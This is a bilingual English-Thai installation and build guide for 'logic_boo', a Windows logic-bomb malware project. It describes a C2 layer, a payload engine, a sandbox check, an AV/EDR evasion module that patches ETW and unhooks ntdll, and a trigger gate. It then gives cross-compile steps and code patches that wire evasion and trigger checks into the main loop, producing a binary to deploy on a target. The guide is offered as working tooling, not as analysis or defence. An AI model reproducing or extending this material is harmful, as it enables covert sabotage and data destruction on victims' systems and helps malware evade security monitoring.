# logic_boo — Installation & Usage Guide
A logic bomb is a piece of malicious code covertly inserted into a software system that remains dormant until specific, 
pre-programmed conditions are met. Unlike standard malware that acts immediately, it lies completely inactive while monitoring for environmental triggers such as a specific date and time, a particular user action, or the absence of a specific database record. Once these trigger conditions are satisfied, the logic bomb executes its payload—ranging from corrupting data and deleting critical files to sabotaging entire system operations—making it a particularly stealthy and dangerous threat often associated with internal sabotage.

## Table Contexts

- [Project structure](#-project-structure)
- [System Requirements](#-system-requirements)
- [Toolchain Installation](#-toolchain-installation)
- [Placing new module files](#-placing-new-module_files)

## 1. Project structure

```text
logic_boo-main/
├── boom.c                ← entry point + poll loop (ต้อง patch)
├── lb_c2.c / lb_c2.h    ← C2 communication layer (ไม่ต้องแก้)
├── lb_payload.c          ← payload execution engine (ต้อง patch)
├── lb_evasion.c          ← [ใหม่] AV/EDR evasion module
├── lb_evasion.h          ← [ใหม่] header สำหรับ lb_evasion
├── lb_trigger.c          ← [ใหม่] five-class pre-execution gate
├── lb_trigger.h          ← [ใหม่] header สำหรับ lb_trigger
├── lb_config.ini         ← runtime configuration
├── Makefile              ← [ใหม่/แทน] full build system
├── setup.sh              ← [ใหม่] automated build + deploy prep script
└── INSTALL.md            ← เอกสารนี้
```

ไฟล์ output หลังจาก build:

```text
build/
└── lb.exe                ← binary ที่ deploy บน target
deploy/
├── stage.dat             ← sentinel file ที่ต้องวางบน target
└── deploy_checklist.txt  ← checklist step-by-step สำหรับ deploy
```

## 2. ความต้องการของระบบ

```text
Component	เวอร์ชันขั้นต่ำ	หมายเหตุ
OS (build host)	Linux / macOS / Windows + WSL2	Cross-compile สำหรับ Windows
MinGW-w64 gcc	>= 9.0	x86_64-w64-mingw32-gcc
GNU make	>= 4.0	make
Python 3	>= 3.8	ใช้โดย setup.sh สำหรับ patch + hash injection
sha256sum / shasum	ใด ๆ	มาพร้อม coreutils / macOS built-in
Windows SDK (ntdll.lib)	ไม่จำเป็น	MinGW-w64 มี -lntdll อยู่แล้ว
```

## 3. การติดตั้ง Toolchain

Ubuntu / Debian
```text
sudo apt update
sudo apt install -y mingw-w64 make python3
```
ตรวจสอบ:
```text
x86_64-w64-mingw32-gcc --version
# คาดหวัง: x86_64-w64-mingw32-gcc (GCC) 12.x.x ...
```
macOS (Homebrew)
```text
brew install mingw-w64 make python3
```
ตรวจสอบ:
```text
x86_64-w64-mingw32-gcc --version
```
Windows + MSYS2
```text
# ใน MSYS2 MinGW64 shell
pacman -S --needed mingw-w64-x86_64-gcc make python3
```

**หมายเหตุ:** ถ้าต้องการใช้ `MSVC (cl.exe)` แทน `MinGW` สามารถทำได้
แต่ lb_evasion.c มี inline __asm__ ที่เป็น GCC syntax
ต้องแยก indirect syscall stubs ออกเป็น .asm แยก + assemble ด้วย ml64.exe
แนะนำให้ใช้ MinGW-w64 เพื่อความสะดวก

## 4. วางไฟล์โมดูลใหม่

ทำขั้นตอนนี้: แตกไฟล์ `logic_boo-main.zip` ออกมา
```text
unzip logic_boo-main_2.zip
cd logic_boo-main
```
วางไฟล์โมดูลใหม่ทั้ง 4 ไฟล์ลงใน directory เดียวกัน:
```text
# สมมติว่าไฟล์โมดูลใหม่อยู่ใน /tmp/
cp /tmp/lb_evasion.c    .
cp /tmp/lb_evasion.h    .
cp /tmp/lb_trigger.c    .
cp /tmp/lb_trigger.h    .
cp /tmp/Makefile        .   # แทนที่ Makefile เดิม
cp /tmp/setup.sh        .
cp /tmp/INSTALL.md      .

chmod +x setup.sh
```
ตรวจสอบว่าไฟล์ครบ:
```text
ls -1 *.c *.h Makefile setup.sh
# ต้องเห็น: boom.c  lb_c2.c  lb_payload.c  lb_evasion.c  lb_trigger.c
#           lb_c2.h  lb_evasion.h  lb_trigger.h
#           Makefile  setup.sh
```

## 5. การ Apply Patch เข้า boom.c และ lb_payload.c
มีสองวิธี:

*วิธี A ใช้ `setup.sh`
```text
./setup.sh --cc x86_64-w64-mingw32-gcc
```
Script จะ:
• Apply patches ใน `boom.c` และ `lb_payload.c` อัตโนมัติ
• Generate deploy/stage.dat + inject SHA-256 เข้า `lb_trigger.c`
• Build `build/lb.exe` release mode
• สร้าง `deploy/deploy_checklist.txt`

*Idempotent: รัน `setup.sh` ซ้ำได้โดยไม่ทำให้ patch ถูก apply ซ้ำ เพราะสคริปต์ ตรวจ sentinel comment ก่อนทุกครั้ง*

*วิธี B แก้ไขแบบ Manuanl
ทำตามลำดับนี้ทุกข้อ ห้ามข้ามเป็นอันขาด:
boom.c — PATCH1:เพิ่ม `#include`
ค้นหาบรรทัด:
```text
#include <time.h>
```
เพิ่มหลังบรรทัดนั้นทันที:
```text
#include "lb_evasion.h"
#include "lb_trigger.h"
```
boom.c — PATCH2: เพิ่ม preamble ใน `main()`
ค้นหาภายใน `int main(void) {` บรรทัดแรกที่เห็น:
```text
    config_load();
```
เพิ่มก่อนบรรทัดนั้น:
```text
    /* 0a. sandbox */
    if (ev_sandbox_check()) return 0;

    /* 0b. AV/EDR evasion */
    ev_init();
    ev_patch_etw_ntdll();
    ev_unhook_ntdll();

    /* 0c. Trigger gate init */
    lt_init();
```
boom.c — PATCH 3: แทนที่ body ของ poll loop
ลบโค้ดทั้งหมดระหว่าง `for (;;) {` กับ `if (fire) break;` (inclusive ของ Sleep) แล้วแทนด้วย:
```text
        int fire = 0;

        if (trigger_signal_file()) {
            fire = 1;   /* operator manual override */
        } else if (lt_evaluate() == LT_ARMED) {
            fire = 1;
        }

        if (fire) break;

        ev_sleep_jitter(60000);
```
`lb_payload.c` — PATCH A: เพิ่ม #include

เช่นเดียวกับ boom.c — ค้นหา #include บรรทัดสุดท้าย แล้วเพิ่ม:
```text
#include "lb_evasion.h"
#include "lb_trigger.h"
```